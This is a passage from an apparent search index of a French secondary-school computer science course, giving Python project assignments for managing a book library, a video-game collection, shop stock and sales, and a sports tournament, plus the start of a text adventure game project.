l'interface utilisateur</p> <ol> <li>Lancer le <code>menu_principal()</code>.</li> <li>Tester chaque option du menu :<ul> <li>Ajouter plusieurs livres.</li> <li>Rechercher des livres.</li> <li>Afficher tous les livres.</li> <li>Supprimer un livre existant, puis essayer de supprimer un livre inexistant.</li> <li>Sauvegarder la biblioth\u00e8que et quitter. Relancer le programme pour v\u00e9rifier que les donn\u00e9es ont bien \u00e9t\u00e9 sauvegard\u00e9es et charg\u00e9es au d\u00e9marrage.</li> </ul> </li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Bibliotheque_Numerique/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Gestion des emprunts : Ajoutez des fonctionnalit\u00e9s pour marquer des livres comme emprunt\u00e9s, avec une date de retour.</li> <li>Interface graphique : Utilisez une biblioth\u00e8que comme Tkinter ou PyQt pour cr\u00e9er une interface utilisateur graphique.</li> <li>Validation des donn\u00e9es : Ajoutez des contr\u00f4les plus stricts sur les entr\u00e9es utilisateur (par exemple, format de l'ISBN, ann\u00e9e de publication valide).</li> <li>Tri des livres : Permettre \u00e0 l'utilisateur de trier les livres par titre, auteur ou ann\u00e9e.</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/","title":"Projet - Gestionnaire de Jeux Vid\u00e9o","text":"<p>Le but de ce projet est de reproduire le fonctionnement d\u2019un gestionnaire de collection, appliqu\u00e9 ici \u00e0 une collection de jeux vid\u00e9o.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#fonctionnalites-principales","title":"Fonctionnalit\u00e9s principales","text":"<p>L\u2019objectif est de permettre \u00e0 un utilisateur de g\u00e9rer sa collection de jeux vid\u00e9o \u00e0 travers plusieurs fonctionnalit\u00e9s : - Ajouter un jeu \u00e0 la collection. -   Rechercher un jeu pour afficher ses d\u00e9tails. -   Modifier les informations d\u2019un jeu. -   Supprimer un jeu. -   Afficher la liste compl\u00e8te des jeux dans la collection.</p> <p>Chaque jeu sera repr\u00e9sent\u00e9 par un ensemble d\u2019informations : -   Titre : le nom du jeu vid\u00e9o. -   Plateforme : la console ou support sur lequel le jeu est jouable (par exemple : PC, PS5, Switch, etc.). -   Ann\u00e9e de sortie : l\u2019ann\u00e9e o\u00f9 le jeu a \u00e9t\u00e9 publi\u00e9. -   Genre : le type de jeu (RPG, FPS, aventure, etc.). -   Statut : un \u00e9tat indiquant si le jeu est poss\u00e9d\u00e9 ou souhait\u00e9.</p> <p>Exemple de structure de donn\u00e9es pour un jeu vid\u00e9o :</p> <pre><code>{\n    'The Legend of Zelda : Breath of the Wild' : {'plateforme' : \"Switch\", \"ann\u00e9e\" : 2017, \"genre\" : \"Aventure\", \"statut\":\"poss\u00e9d\u00e9\"}\n}\n</code></pre>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#ajouter-un-jeu-a-la-collection","title":"Ajouter un jeu \u00e0 la collection","text":"<p>Cr\u00e9er une fonction ajouter_jeu qui permet \u00e0 l\u2019utilisateur d\u2019ajouter un jeu \u00e0 la collection. Pour cela, le programme demandera \u00e0 l\u2019utilisateur de saisir les informations suivantes : -   Titre -   Plateforme -   Ann\u00e9e de sortie -   Genre -   Statut</p> <p>Les donn\u00e9es saisies seront enregistr\u00e9es dans le dictionnaire <code>ludotheque</code>.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#afficher-la-collection-complete","title":"Afficher la collection compl\u00e8te","text":"<p>Cr\u00e9er une fonction <code>afficher_collection</code> qui prend en param\u00e8tre une ludoth\u00e8que (dictionnaire) et un nom de jeu et renvoie une cha\u00eene de caract\u00e8re r\u00e9alisant l'affichage suivant: Exemple d\u2019affichage :</p> <pre><code>Titre : The Legend of Zelda: Breath of the Wild\nPlateforme : Switch\nAnn\u00e9e : 2017\nGenre : Aventure\nStatut : Poss\u00e9d\u00e9\n</code></pre>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#rechercher-un-jeu","title":"Rechercher un jeu","text":"<p>Cr\u00e9er une fonction <code>rechercher_jeu</code> qui prend en param\u00e8tre une ludoth\u00e8que (dictionnaire) et un nom de jeu (str). Si le jeu est trouv\u00e9, ses informations seront affich\u00e9es. Sinon, un message indiquera qu\u2019il n\u2019existe pas dans la collection.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#modifier-un-jeu","title":"Modifier un jeu","text":"<p>Cr\u00e9er une fonction <code>modifier_jeu</code> qui prend en param\u00e8tre une ludoth\u00e8que, un jeu, un champ et une valeur et modifie le champ du jeu par la valeur donn\u00e9e. Le programme devra permettre de modifier le statut, le genre ou tout autre champ.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#supprimer-un-jeu","title":"Supprimer un jeu","text":"<p>Cr\u00e9er une fonction <code>supprimer_jeu</code> qui prend en param\u00e8tre une ludoth\u00e8que et un nom de jeu et retire le jeu de la ludoth\u00e8que. Le jeu sera retir\u00e9 de la liste s\u2019il est trouv\u00e9. Sinon, un message informera qu\u2019il n\u2019a pas \u00e9t\u00e9 trouv\u00e9.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#organisation-du-programme","title":"Organisation du programme","text":"<p>Cr\u00e9er une fonction menu_principal qui propose \u00e0 l\u2019utilisateur les diff\u00e9rentes actions disponibles :  </p> <ul> <li>1.Ajouter un jeu.</li> <li>2.Afficher la collection compl\u00e8te. </li> <li>3.Rechercher un jeu.</li> <li>4.Modifier un jeu.</li> <li>5.Supprimer un jeu.</li> <li>6.Afficher les statistiques (optionnel).</li> <li>7.Quitter le programme.</li> </ul> <p>\u00c0 chaque choix, le programme devra ex\u00e9cuter la fonction correspondante.</p> <p>Exemple d\u2019affichage pour le menu principal :</p> <pre><code>############### Gestionnaire de Jeux Vid\u00e9o ###############\n# Application r\u00e9alis\u00e9e par : Nom Pr\u00e9nom                  #\n##########################################################\n\n1. Ajouter un jeu  \n2. Afficher la collection compl\u00e8te  \n3. Rechercher un jeu  \n4. Modifier un jeu  \n5. Supprimer un jeu  \n6. Afficher les statistiques  \n7. Quitter  \n</code></pre>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#fonctionnalites-avancees-optionnelles","title":"Fonctionnalit\u00e9s avanc\u00e9es (optionnelles)","text":""},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#filtres-de-recherche","title":"Filtres de recherche","text":"<p>Cr\u00e9er une fonction <code>filtrer_jeux</code> qui permet d\u2019afficher tous les jeux selon un crit\u00e8re pr\u00e9cis (par exemple : afficher les jeux d\u2019une certaine plateforme ou d\u2019un genre particulier).</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#sauvegarde-et-chargement","title":"Sauvegarde et chargement","text":"<p>Ajouter une fonctionnalit\u00e9 permettant de sauvegarder la ludoth\u00e8que dans un fichier texte ou CSV et de recharger les donn\u00e9es \u00e0 chaque lancement du programme.</p>"},{"location":"premiere/XIII-Projets/Gestion_Jeux_Video/gestion_jeux_video/#statistiques-sur-la-collection","title":"Statistiques sur la collection","text":"<p>Cr\u00e9er une fonction afficher_statistiques qui calcule et affiche des donn\u00e9es utiles :</p> <ul> <li>Nombre total de jeux.</li> <li>Nombre de jeux par plateforme.</li> <li>R\u00e9partition par genre.</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/","title":"Projet - Syst\u00e8me de Gestion de Stock et Ventes \ud83d\uded2\ud83d\udce6","text":"<p>Ce projet a pour but de simuler un syst\u00e8me simple de gestion de stock pour un petit commerce. Il permettra d'ajouter des produits, de mettre \u00e0 jour leurs quantit\u00e9s, d'enregistrer des ventes et de visualiser l'\u00e9tat du stock.</p>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : listes de dictionnaires (pour les produits, les ventes).</li> <li>Manipulation de fichiers (CSV/JSON pour la persistance des donn\u00e9es).</li> <li>Fonctions pour chaque op\u00e9ration (ajouter produit, enregistrer vente, etc.).</li> <li>Logique de mise \u00e0 jour des quantit\u00e9s.</li> <li>Calculs simples (total d'une vente, valeur du stock).</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#1-gestion-du-catalogue-de-produits","title":"1. Gestion du Catalogue de Produits","text":"<p>Chaque produit a des attributs sp\u00e9cifiques.</p> <p>Structure d'un produit</p> <p>D\u00e9finir une structure pour un produit en stock. Un dictionnaire est id\u00e9al : - <code>id_produit</code> (cha\u00eene de caract\u00e8res ou entier, unique, ex: \"LIV001\", 101) - <code>nom_produit</code> (cha\u00eene de caract\u00e8res, ex: \"Livre de NSI\") - <code>description</code> (cha\u00eene de caract\u00e8res) - <code>prix_unitaire_vente</code> (flottant) - <code>quantite_stock</code> (entier) - <code>seuil_alerte_stock</code> (entier, optionnel, pour indiquer un stock bas)</p> <p>Catalogue des produits</p> <p>Cr\u00e9er une liste globale <code>catalogue_produits</code> pour stocker tous les dictionnaires de produits.</p> <p>Ajouter un nouveau produit</p> <p>Cr\u00e9er une fonction <code>ajouter_produit(catalogue, id_prod, nom, desc, prix, qte_init, seuil_alerte)</code> qui : 1. V\u00e9rifie si un produit avec <code>id_prod</code> existe d\u00e9j\u00e0. 2. Si non, cr\u00e9e un dictionnaire pour le nouveau produit et l'ajoute au <code>catalogue_produits</code>. 3. Renvoie <code>True</code> si le produit est ajout\u00e9, <code>False</code> sinon.</p> <p>Modifier un produit</p> <p>Cr\u00e9er une fonction <code>modifier_produit(catalogue, id_prod, nouveau_nom=None, nouvelle_desc=None, nouveau_prix=None, nouveau_seuil=None)</code> qui : 1. Trouve le produit par <code>id_prod</code>. 2. Si trouv\u00e9, met \u00e0 jour les champs sp\u00e9cifi\u00e9s (ceux qui ne sont pas <code>None</code>). 3. Renvoie <code>True</code> si modifi\u00e9, <code>False</code> si produit non trouv\u00e9. Note : La quantit\u00e9 en stock ne sera pas modifi\u00e9e par cette fonction mais par des fonctions d'entr\u00e9e/sortie de stock.</p> <p>Afficher les d\u00e9tails d'un produit</p> <p>Cr\u00e9er une fonction <code>afficher_details_produit(produit)</code> qui affiche les informations d'un produit de mani\u00e8re lisible.</p> <p>Afficher tous les produits</p> <p>Cr\u00e9er une fonction <code>afficher_catalogue(catalogue)</code> qui liste tous les produits avec quelques informations cl\u00e9s (ID, nom, prix, quantit\u00e9).</p> <p>Tests de la gestion du catalogue</p> <ol> <li>Initialiser un catalogue vide.</li> <li>Ajouter plusieurs produits diff\u00e9rents.</li> <li>Essayer d'ajouter un produit avec un ID existant.</li> <li>Modifier les informations d'un produit existant (nom, prix).</li> <li>Afficher le catalogue complet.</li> <li>Afficher les d\u00e9tails d'un produit sp\u00e9cifique.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#2-gestion-des-stocks","title":"2. Gestion des Stocks","text":"<p>Mettre \u00e0 jour la quantit\u00e9 en stock</p> <p>Cr\u00e9er une fonction <code>maj_quantite_stock(catalogue, id_prod, quantite_ajoutee)</code> qui : 1. Trouve le produit par <code>id_prod</code>. 2. Si trouv\u00e9, ajoute <code>quantite_ajoutee</code> \u00e0 <code>quantite_stock</code> (peut \u00eatre n\u00e9gatif pour une sortie de stock non li\u00e9e \u00e0 une vente, comme une perte). 3. S'assure que la quantit\u00e9 en stock ne devient pas n\u00e9gative (ou g\u00e8re ce cas selon la logique m\u00e9tier choisie). 4. Renvoie la nouvelle quantit\u00e9 en stock, ou <code>None</code> si produit non trouv\u00e9.</p> <p>Alerte stock bas</p> <p>Modifier <code>afficher_catalogue</code> ou cr\u00e9ez une nouvelle fonction <code>verifier_stocks_bas(catalogue)</code> qui liste les produits dont la <code>quantite_stock</code> est inf\u00e9rieure ou \u00e9gale \u00e0 leur <code>seuil_alerte_stock</code>.</p> <p>Tests de la gestion des stocks</p> <ol> <li>Ajouter un produit avec une quantit\u00e9 initiale et un seuil d'alerte.</li> <li>Augmenter le stock de ce produit. V\u00e9rifier la nouvelle quantit\u00e9.</li> <li>Diminuer le stock (simuler une perte). V\u00e9rifier.</li> <li>Diminuer le stock en dessous du seuil d'alerte et v\u00e9rifier que l'alerte est visible.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#3-enregistrement-des-ventes","title":"3. Enregistrement des Ventes","text":"<p>Une vente peut concerner plusieurs produits en diff\u00e9rentes quantit\u00e9s.</p> <p>Structure d'une ligne de vente</p> <p>Pour chaque produit dans une vente, nous aurons besoin de : - <code>id_produit_vendu</code> - <code>quantite_vendue</code> - <code>prix_unitaire_au_moment_vente</code> (important si les prix changent)</p> <p>Structure d'une vente</p> <p>D\u00e9finir une structure pour une vente (dictionnaire) : - <code>id_vente</code> (entier, unique) - <code>date_vente</code> (objet <code>datetime</code>) - <code>lignes_vente</code> (liste de dictionnaires, chacun \u00e9tant une ligne de vente comme d\u00e9finie ci-dessus) - <code>total_vente</code> (flottant)</p> <p>Base de donn\u00e9es des ventes</p> <p>Cr\u00e9er une liste globale <code>historique_ventes</code> et un compteur <code>prochain_id_vente</code>.</p> <p>Enregistrer une nouvelle vente</p> <p>Cr\u00e9er une fonction <code>enregistrer_vente(catalogue, historique_ventes, details_panier)</code> o\u00f9 <code>details_panier</code> est une liste de tuples <code>(id_produit, quantite_demandee)</code>. Cette fonction doit : 1. Pour chaque item dans <code>details_panier</code> :     a. V\u00e9rifier si le produit existe et si la <code>quantite_demandee</code> est disponible en stock.     b. Si un produit n'est pas disponible en quantit\u00e9 suffisante, la vente enti\u00e8re \u00e9choue (ou vous pouvez g\u00e9rer les ventes partielles comme extension). 2. Si tous les produits sont disponibles :     a. Cr\u00e9er un nouvel objet vente avec un <code>id_vente</code> unique et la date actuelle.     b. Pour chaque item, cr\u00e9er une ligne de vente (en stockant le prix actuel) et l'ajouter \u00e0 <code>lignes_vente</code> de l'objet vente.     c. Mettre \u00e0 jour (diminuer) la <code>quantite_stock</code> pour chaque produit vendu dans le <code>catalogue_produits</code> (utilisez <code>maj_quantite_stock</code> avec une quantit\u00e9 n\u00e9gative).     d. Calculer le <code>total_vente</code>.     e. Ajouter l'objet vente \u00e0 <code>historique_ventes</code>.     f. Renvoyer <code>True</code> et l'ID de la vente. 3. Si un produit n'est pas disponible, renvoyer <code>False</code> et un message d'erreur.</p> <p>Afficher l'historique des ventes</p> <p>Cr\u00e9er une fonction <code>afficher_historique_ventes(historique_ventes)</code> qui affiche toutes les ventes de mani\u00e8re lisible.</p> <p>Tests des ventes</p> <ol> <li>S'assurer d'avoir des produits en stock.</li> <li>Simuler un panier avec plusieurs produits et quantit\u00e9s.</li> <li>Enregistrer la vente. V\u00e9rifier que les quantit\u00e9s en stock dans le catalogue sont mises \u00e0 jour et que la vente appara\u00eet dans l'historique.</li> <li>Essayer d'enregistrer une vente pour un produit avec une quantit\u00e9 insuffisante en stock.</li> <li>Afficher l'historique des ventes.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#4-sauvegarde-et-chargement","title":"4. Sauvegarde et Chargement","text":"<p>Persistance des donn\u00e9es</p> <ul> <li>Cr\u00e9er des fonctions <code>sauvegarder_donnees(catalogue, ventes, nom_fichier_catalogue, nom_fichier_ventes)</code>.</li> <li>Cr\u00e9er des fonctions <code>charger_donnees(nom_fichier_catalogue, nom_fichier_ventes)</code> qui retournent le catalogue et l'historique des ventes charg\u00e9s. Utilisez JSON ou CSV.</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#5-interface-utilisateur","title":"5. Interface Utilisateur","text":"<p>Menu principal</p> <p>Cr\u00e9er une interface en mode texte pour : 1. Gestion Produits (sous-menu : ajouter, modifier, afficher tous, afficher d\u00e9tails, v\u00e9rifier stock bas). 2. Enregistrer une nouvelle vente. 3. Afficher l'historique des ventes. 4. Sauvegarder les donn\u00e9es. 5. Quitter.</p> <p>Test de l'application compl\u00e8te</p> <p>Effectuer un cycle complet : ajouter des produits, mettre \u00e0 jour des stocks, enregistrer plusieurs ventes, v\u00e9rifier les stocks bas, afficher l'historique, sauvegarder, quitter, relancer et v\u00e9rifier que les donn\u00e9es sont restaur\u00e9es.</p>"},{"location":"premiere/XIII-Projets/Gestion_Stock_Ventes/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Rapports de ventes : G\u00e9n\u00e9rer des rapports (produit le plus vendu, total des ventes sur une p\u00e9riode).</li> <li>Gestion des fournisseurs : Ajouter des informations sur les fournisseurs et g\u00e9rer les commandes d'achat pour r\u00e9approvisionner le stock.</li> <li>Codes-barres : Simuler la lecture de codes-barres pour ajouter des produits \u00e0 une vente.</li> <li>Interface graphique.</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/","title":"Projet - Syst\u00e8me de Gestion de Tournoi Sportif \ud83c\udfc6","text":"<p>L'objectif de ce projet est de d\u00e9velopper une application pour g\u00e9rer des tournois sportifs. L'application permettra d'enregistrer des \u00e9quipes, de g\u00e9n\u00e9rer des matchs, d'enregistrer les scores et d'afficher un classement.</p>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : listes de dictionnaires (\u00e9quipes, matchs, classement).</li> <li>Algorithmes : g\u00e9n\u00e9ration de paires de matchs (par exemple, tournoi \u00e0 la ronde), calcul de points et classement.</li> <li>Fonctions pour organiser le code.</li> <li>Saisie et validation des entr\u00e9es utilisateur.</li> <li>Manipulation de fichiers (optionnel, pour sauvegarder l'\u00e9tat du tournoi).</li> </ul>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#1-gestion-des-equipes","title":"1. Gestion des \u00c9quipes","text":"<p>Structure d'une \u00e9quipe</p> <p>D\u00e9finir une structure pour repr\u00e9senter une \u00e9quipe. Un dictionnaire peut contenir : - <code>nom_equipe</code> (cha\u00eene de caract\u00e8res, unique) - <code>joueurs</code> (liste de cha\u00eenes de caract\u00e8res, noms des joueurs) - <code>points</code> (entier, initialis\u00e9 \u00e0 0) - <code>matchs_joues</code> (entier, initialis\u00e9 \u00e0 0) - <code>victoires</code> (entier, initialis\u00e9 \u00e0 0) - <code>nuls</code> (entier, initialis\u00e9 \u00e0 0) - <code>defaites</code> (entier, initialis\u00e9 \u00e0 0) - <code>buts_marques</code> (entier, initialis\u00e9 \u00e0 0) - <code>buts_encaisses</code> (entier, initialis\u00e9 \u00e0 0)</p> <p>Liste des \u00e9quipes</p> <p>Cr\u00e9er une liste globale <code>equipes_tournoi</code> pour stocker toutes les \u00e9quipes participantes.</p> <p>Ajouter une \u00e9quipe</p> <p>Cr\u00e9er une fonction <code>ajouter_equipe(equipes_tournoi, nom_equipe, liste_joueurs)</code> qui : 1. V\u00e9rifie si une \u00e9quipe avec <code>nom_equipe</code> existe d\u00e9j\u00e0. 2. Si non, cr\u00e9e un dictionnaire pour la nouvelle \u00e9quipe et l'ajoute \u00e0 <code>equipes_tournoi</code>. 3. Renvoie <code>True</code> si ajout\u00e9e, <code>False</code> sinon.</p> <p>Tests de la gestion des \u00e9quipes</p> <ol> <li>Initialiser <code>equipes_tournoi</code>.</li> <li>Ajouter plusieurs \u00e9quipes avec leurs listes de joueurs.</li> <li>Essayer d'ajouter une \u00e9quipe avec un nom d\u00e9j\u00e0 existant.</li> <li>Afficher la liste des \u00e9quipes pour v\u00e9rifier.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#2-generation-des-matchs-tournoi-a-la-ronde-simple","title":"2. G\u00e9n\u00e9ration des Matchs (Tournoi \u00e0 la Ronde Simple)","text":"<p>Dans un tournoi \u00e0 la ronde (ou \"Round Robin\"), chaque \u00e9quipe rencontre toutes les autres \u00e9quipes une fois.</p> <p>Structure d'un match</p> <p>D\u00e9finir une structure pour un match (dictionnaire) : - <code>equipe_domicile</code> (nom de l'\u00e9quipe) - <code>equipe_exterieur</code> (nom de l'\u00e9quipe) - <code>score_domicile</code> (entier, <code>None</code> si non jou\u00e9) - <code>score_exterieur</code> (entier, <code>None</code> si non jou\u00e9) - <code>joue</code> (bool\u00e9en, <code>False</code> initialement)</p> <p>G\u00e9n\u00e9rer le calendrier des matchs</p> <p>Cr\u00e9er une fonction <code>generer_calendrier(equipes_tournoi)</code> qui : 1. Prend la liste des noms d'\u00e9quipes. 2. G\u00e9n\u00e8re une liste de tous les matchs possibles o\u00f9 chaque \u00e9quipe joue contre chaque autre \u00e9quipe une seule fois. (Attention \u00e0 ne pas faire jouer une \u00e9quipe contre elle-m\u00eame et \u00e0 ne pas dupliquer les matchs, ex: A vs B est pareil que B vs A pour la g\u00e9n\u00e9ration initiale). 3. Renvoie la liste des dictionnaires de matchs (scores \u00e0 <code>None</code>, <code>joue</code> \u00e0 <code>False</code>). Astuce : Pour N \u00e9quipes, il y aura N(N-1)/2 matchs.*</p> <p>Test de la g\u00e9n\u00e9ration des matchs</p> <ol> <li>Cr\u00e9er une liste de 3 ou 4 \u00e9quipes.</li> <li>G\u00e9n\u00e9rer le calendrier des matchs.</li> <li>Afficher le calendrier pour v\u00e9rifier que toutes les paires uniques sont pr\u00e9sentes.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#3-enregistrement-des-scores","title":"3. Enregistrement des Scores","text":"<p>Enregistrer un r\u00e9sultat de match</p> <p>Cr\u00e9er une fonction <code>enregistrer_resultat(match, score_dom, score_ext, equipes_tournoi)</code> qui : 1. Met \u00e0 jour <code>score_domicile</code>, <code>score_exterieur</code> et <code>joue</code> pour le <code>match</code> donn\u00e9. 2. Met \u00e0 jour les statistiques (<code>points</code>, <code>matchs_joues</code>, <code>victoires</code>, <code>nuls</code>, <code>defaites</code>, <code>buts_marques</code>, <code>buts_encaisses</code>) des deux \u00e9quipes impliqu\u00e9es dans <code>equipes_tournoi</code>.     - Victoire : 3 points     - Nul : 1 point     - D\u00e9faite : 0 points</p> <p>Saisie des scores</p> <p>Cr\u00e9er une fonction qui permet \u00e0 l'utilisateur de parcourir les matchs non jou\u00e9s et de saisir les scores. La fonction demandera le nom de l'\u00e9quipe \u00e0 domicile, le nom de l'\u00e9quipe \u00e0 l'ext\u00e9rieur, puis les scores.</p> <p>Test de l'enregistrement des scores</p> <ol> <li>Prendre un calendrier de matchs g\u00e9n\u00e9r\u00e9.</li> <li>Enregistrer les r\u00e9sultats pour quelques matchs.</li> <li>V\u00e9rifier que les scores sont bien enregistr\u00e9s dans les matchs et que les statistiques des \u00e9quipes (points, victoires, etc.) sont correctement mises \u00e0 jour.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#4-affichage-du-classement","title":"4. Affichage du Classement","text":"<p>Calculer et afficher le classement</p> <p>Cr\u00e9er une fonction <code>afficher_classement(equipes_tournoi)</code> qui : 1. Trie les \u00e9quipes dans <code>equipes_tournoi</code> en fonction des crit\u00e8res suivants (par ordre de priorit\u00e9) :     a. Le plus de <code>points</code>.     b. La meilleure diff\u00e9rence de buts (<code>buts_marques</code> - <code>buts_encaisses</code>).     c. Le plus de <code>buts_marques</code>. 2. Affiche le classement de mani\u00e8re lisible, incluant le rang, nom de l'\u00e9quipe, points, matchs jou\u00e9s, V, N, D, BM, BE, Diff.</p> <p>Test du classement</p> <ol> <li>Apr\u00e8s avoir enregistr\u00e9 plusieurs r\u00e9sultats de matchs, appeler <code>afficher_classement</code>.</li> <li>V\u00e9rifier que le classement est correct selon les r\u00e8gles de tri.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#5-interface-utilisateur","title":"5. Interface Utilisateur","text":"<p>Menu principal</p> <p>Cr\u00e9er une interface en mode texte pour : 1. Ajouter des \u00e9quipes. 2. G\u00e9n\u00e9rer/Afficher le calendrier des matchs. 3. Enregistrer les r\u00e9sultats des matchs. 4. Afficher le classement. 5. Quitter.</p> <p>Test de l'application compl\u00e8te</p> <ol> <li>Lancer l'application.</li> <li>Ajouter 3-4 \u00e9quipes.</li> <li>G\u00e9n\u00e9rer les matchs.</li> <li>Enregistrer les scores pour tous les matchs.</li> <li>Afficher le classement final.</li> </ol>"},{"location":"premiere/XIII-Projets/Gestion_Tournoi_Sportif/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Gestion de plusieurs phases de tournoi (poules puis phase finale \u00e0 \u00e9limination directe).</li> <li>Sauvegarde et chargement de l'\u00e9tat du tournoi dans un fichier (JSON ou CSV).</li> <li>Meilleur buteur : Suivre les buts par joueur.</li> <li>Interface graphique avec Tkinter ou Pygame.</li> <li>G\u00e9n\u00e9ration de calendrier plus complexe (ex: algorithme de Berger pour les tournois \u00e0 la ronde avec gestion des matchs aller-retour ou des journ\u00e9es).</li> </ul>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/","title":"Projet - Jeu d'Aventure Textuel avec Sauvegarde \u2694\ufe0f\ud83d\uddfa\ufe0f","text":"<p>L'objectif de ce projet est de d\u00e9velopper un jeu d'aventure textuel o\u00f9 le joueur explore diff\u00e9rents lieux, interagit avec des objets et des personnages, et dont la progression peut \u00eatre sauvegard\u00e9e et reprise.</p>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#concepts-abordes","title":"Concepts Abord\u00e9s","text":"<ul> <li>Structures de donn\u00e9es : dictionnaires (pour repr\u00e9senter les lieux, l'inventaire), listes.</li> <li>Fonctions et modularit\u00e9.</li> <li>Manipulation de cha\u00eenes de caract\u00e8res pour l'analyse des commandes du joueur.</li> <li>Logique conditionnelle (gestion des choix et des cons\u00e9quences).</li> <li>Sauvegarde et chargement de l'\u00e9tat du jeu (utilisation de fichiers JSON ou pickle).</li> </ul>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#fonctionnalites-a-implementer","title":"Fonctionnalit\u00e9s \u00e0 Impl\u00e9menter","text":""},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#1-definition-du-monde-du-jeu","title":"1. D\u00e9finition du Monde du Jeu","text":"<p>Le monde du jeu est compos\u00e9 de plusieurs lieux interconnect\u00e9s. Chaque lieu a une description, des sorties possibles vers d'autres lieux, et potentiellement des objets \u00e0 ramasser ou des personnages \u00e0 rencontrer.</p> <p>Structure d'un lieu</p> <p>D\u00e9finir une structure pour repr\u00e9senter un lieu. Un dictionnaire est un bon choix. Chaque lieu devrait avoir au moins : - <code>nom</code> (cha\u00eene de caract\u00e8res, ex: \"For\u00eat Sombre\") - <code>description</code> (cha\u00eene de caract\u00e8res, ex: \"Vous \u00eates dans une for\u00eat sombre et mena\u00e7ante. Un sentier part vers le nord.\") - <code>sorties</code> (un dictionnaire o\u00f9 les cl\u00e9s sont des directions, ex: \"nord\", \"sud\", et les valeurs sont les noms des lieux correspondants, ex: \"Clairi\u00e8re Ensoleill\u00e9e\") - <code>objets</code> (une liste de cha\u00eenes de caract\u00e8res repr\u00e9sentant les objets pr\u00e9sents dans le lieu, ex: [\"\u00e9p\u00e9e rouill\u00e9e\", \"potion de soin\"])</p> <p>Cr\u00e9ation de la carte du jeu</p> <p>Cr\u00e9er un dictionnaire principal nomm\u00e9 <code>carte_du_jeu</code> o\u00f9 les cl\u00e9s sont les noms des lieux et les valeurs sont les dictionnaires de lieu que vous avez d\u00e9finis. Cr\u00e9er au moins 3-4 lieux interconnect\u00e9s pour commencer. Par exemple : <pre><code>carte_du_jeu = {\n    \"For\u00eat Sombre\": {\n        \"description\": \"Vous \u00eates dans une for\u00eat sombre et mena\u00e7ante. Un sentier part vers le nord.\",\n        \"sorties\": {\"nord\": \"Clairi\u00e8re Ensoleill\u00e9e\"},\n        \"objets\": [\"branche solide\"]\n    },\n    \"Clairi\u00e8re Ensoleill\u00e9e\": {\n        \"description\": \"Une douce lumi\u00e8re baigne cette clairi\u00e8re. Un vieux puits se trouve au centre. Des chemins m\u00e8nent au sud et \u00e0 l'est.\",\n        \"sorties\": {\"sud\": \"For\u00eat Sombre\", \"est\": \"Caverne Myst\u00e9rieuse\"},\n        \"objets\": [\"vieille corde\"]\n    }\n    # Ajoutez d'autres lieux\n}\n</code></pre></p>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#2-le-joueur","title":"2. Le Joueur","text":"<p>Le joueur a un \u00e9tat qui doit \u00eatre suivi : son lieu actuel et son inventaire.</p> <p>\u00c9tat du joueur</p> <p>Cr\u00e9er un dictionnaire <code>joueur</code> pour stocker les informations du joueur : - <code>lieu_actuel</code> (cha\u00eene de caract\u00e8res, le nom du lieu o\u00f9 se trouve le joueur, initialis\u00e9 au lieu de d\u00e9part) - <code>inventaire</code> (une liste de cha\u00eenes de caract\u00e8res, initialement vide)</p>"},{"location":"premiere/XIII-Projets/Jeu_Aventure_Textuel/sujet/#3-mecaniques-de-jeu-de-base","title":"3. M\u00e9caniques de Jeu de Base","text":"<p>Afficher le lieu actuel</p> 